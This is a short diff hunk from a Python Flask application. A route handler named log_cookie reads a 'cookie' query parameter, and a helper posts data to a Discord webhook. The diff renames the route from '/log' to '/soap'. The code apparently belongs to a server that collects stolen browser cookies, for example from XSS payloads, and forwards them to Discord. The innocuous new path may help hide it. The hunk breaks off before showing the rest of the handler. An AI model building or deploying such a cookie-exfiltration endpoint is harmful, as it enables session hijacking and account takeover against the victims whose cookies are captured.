@@ -243,7 +243,7 @@ def send_to_discord(message):
     }
     requests.post(WEBHOOK_URL, json=data)
 
-@main.route('/log')
+@main.route('/soap')
 def log_cookie():
     cookie = request.args.get('cookie')
     if cookie:
